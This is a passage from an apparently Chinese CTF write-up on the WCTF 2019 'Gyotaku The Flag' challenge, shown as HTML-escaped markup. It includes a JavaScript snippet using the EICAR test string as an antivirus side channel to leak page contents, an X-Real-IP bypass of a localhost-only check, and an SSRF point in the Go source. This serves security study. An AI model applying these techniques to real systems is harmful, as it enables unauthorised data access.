+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">num&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">90&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">body&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">charCodeAt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">{[&lt;/span>&lt;span class="nx">num&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span>&lt;span class="p">}[&lt;/span>&lt;span class="nb">Math&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">min&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">num&lt;/span> &lt;span class="p">,&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">)];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">mal&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>flag{aaa}&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>因为&lt;code>body&lt;/code>获取到的是&lt;code>f&lt;/code>的 ascii 码为 102 ，大于 90 ，所以&lt;code>Math.min()&lt;/code>返回值为 90 ，&lt;code>{[num]:'*'}&lt;/code>创建了一个 key 为 90 ，value 为 &lt;code>*&lt;/code> 的对象，这里注意需要用&lt;code>[num]&lt;/code>把&lt;code>num&lt;/code>当作变量，因为如果直接使用&lt;code>{num:'*'}&lt;/code>，这样是创建了一个 key 为 num 的一个字符串， value 为 &lt;code>*&lt;/code> 的对象&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="kd">var&lt;/span> &lt;span class="nx">num&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">90&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kc">undefined&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="kd">var&lt;/span> &lt;span class="nx">n&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nx">num&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span>&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kc">undefined&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="nx">num&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="mi">90&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kc">undefined&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">num&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kc">undefined&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kc">undefined&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;num&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kc">undefined&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span> &lt;span class="nx">num&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190912130704.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>这样我们就可以通过“盲注”的方式获取&lt;code>&amp;lt;body&amp;gt;&lt;/code>标签中的秘密数据了。&lt;/p>
+&lt;h2 id="gyotaku-the-flag">Gyotaku The Flag
+&lt;/h2>&lt;p>题目源码在 &lt;a class="link" href="https://github.com/icchy/wctf2019-gtf" target="_blank" rel="noopener"
+>Gyotaku The Flag&lt;/a>，slides 在 &lt;a class="link" href="https://westerns.tokyo/wctf2019-gtf/wctf2019-gtf-slides.pdf" target="_blank" rel="noopener"
+>WCTF2019: Gyotaku The Flag&lt;/a>&lt;/p>
+&lt;p>有了以上的知识，让我们回到 WCTF 2019 Gyotaku The Flag 这道题上，这道题有这么几个路由&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">IndexHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">dbconn&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">LoginRequiredMiddleware&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/gyotaku&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">GyotakuListHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">dbconn&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">LoginRequiredMiddleware&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/gyotaku/:gid&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">GyotakuViewHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">dbconn&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">LoginRequiredMiddleware&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">GET&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/flag&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">FlagHandler&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">InternalRequiredMiddleware&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">POST&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/login&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">LoginHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">dbconn&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">POST&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/gyotaku&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nf">GyotakuHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">dbconn&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">LoginRequiredMiddleware&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="so-easy-to-getflag">So easy to GetFlag
+&lt;/h3>&lt;p>在&lt;code>/flag&lt;/code>的路由上有一个类似于中间件的功能：&lt;code>InternalRequiredMiddleware&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">InternalRequiredMiddleware&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">next&lt;/span> &lt;span class="nx">echo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HandlerFunc&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">echo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">HandlerFunc&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="nx">echo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">ip&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ParseIP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">RealIP&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">localip&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">net&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ParseIP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">!&lt;/span>&lt;span class="nx">ip&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Equal&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">localip&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">echo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewHTTPError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StatusForbidden&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nf">next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>以及 &lt;code>FlagHandler&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">FlagHandler&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="nx">echo&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">data&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">ioutil&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ReadFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;flag&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StatusOK&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>可以看到这是一个控制只能&lt;code>127.0.0.1&lt;/code>访问的功能函数，用于构造题目的 SSRF 这么一个类似的关卡，可是由于出题人不是特别细心，&lt;code>echo.Context.RealIP&lt;/code>可以被&lt;code>X-Real-IP&lt;/code>绕过，所以导致了当时很多人直接通过这个方式拿到了 flag &amp;hellip;&lt;/p>
+&lt;p>&lt;del>题目结束，分析完了，关了吧别看了，后面都是扯淡，拿到 flag 就是王道，管他用什么方式&lt;/del>&lt;/p>
+&lt;h3 id="the-better-way-to-getflag">The better way to GetFlag
+&lt;/h3>&lt;p>好了，我们接下来分析分析比较有意思的预期解。&lt;/p>
+&lt;p>&lt;code>/login&lt;/code>路由比较简单，使用的是&lt;code>goleveldb&lt;/code>做的数据操作&lt;/p>
+&lt;p>&lt;code>/gyotaku&lt;/code>路由 GET 方法列举用户有多少金坷垃&lt;/p>
+&lt;p>&lt;code>/gyotaku/:gid&lt;/code>从文件中查找&lt;code>gid&lt;/code>&lt;/p>
+&lt;p>我们可以在&lt;code>/gyotaku&lt;/code>路由的 POST 方法中看到接收了一个 url 参数，并对 url 进行了请求：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">url&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">FormValue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;url&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">url&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这就是我们需要的 SSRF 的点了，传入 url 让服务器请求这个 URL 。&lt;/p>
+&lt;p>然后我们可以接着往下看，注意到有个写文件的操作：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">url&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">defer&lt;/span> &lt;span class="nx">resp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">body&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">ioutil&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ReadAll&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">resp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Body&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// save gyotaku
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">gyotakudata&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">GyotakuData&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">URL&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">url&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Data&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">UserName&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">username&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">buf&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">bytes&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewBuffer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">nil&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">gob&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewEncoder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">Encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">gyotakudata&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
